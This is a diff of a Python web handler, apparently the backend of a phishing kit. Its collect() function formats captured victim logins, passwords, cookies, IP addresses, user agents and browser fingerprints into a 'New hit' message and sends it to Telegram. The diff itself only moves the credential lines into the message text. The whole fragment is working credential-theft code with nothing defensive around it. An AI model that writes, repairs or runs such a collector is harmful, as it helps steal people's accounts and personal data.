@@ -45,8 +45,8 @@ def collect():
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
     
     msg = f"""🚨 <b>New hit</b>
-    login    = data.get("login", "—")
-password = data.get("password", "—")
+    🔑 <b>Login:</b> <code>{login}</code>
+🔒 <b>Password:</b> <code>{password}</code>
 ⏰ {now}
 🌐 <b>IP:</b> <code>{ip}</code>
 📱 <b>UA:</b> <code>{ua[:200]}</code>
@@ -58,8 +58,7 @@ password = data.get("password", "—")
 📎 <b>Referer:</b> {ref}
 🍪 <b>Cookies:</b> <code>{str(cookies)[:250]}</code>
 🧬 <b>FP:</b> <code>{fp}</code>"""
-    🔑 <b>Login:</b> <code>{login}</code>
-🔒 <b>Password:</b> <code>{password}</code>
+
     
     send_to_tg(msg)
     return jsonify({"ok": True})
